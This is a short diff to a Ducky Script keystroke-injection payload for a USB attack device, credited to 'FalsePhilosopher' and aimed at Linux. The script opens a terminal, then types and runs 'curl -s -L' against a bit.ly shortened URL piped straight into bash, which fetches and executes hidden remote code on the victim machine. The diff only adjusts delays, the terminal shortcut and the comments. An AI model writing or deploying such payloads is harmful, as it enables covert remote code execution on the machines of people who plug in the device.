@@ -1,9 +1,8 @@
 REM FalsePhilosopher
-REM WIP
-REM Needs curl
+REM target linux
 DELAY 300
-CTRL-ALT+t
-DELAY 500
+CTRL-ALT t
+DELAY 2000
 STRING curl -s -L http://bit.ly/10hA8iC | bash
 DELAY 300
 ENTER
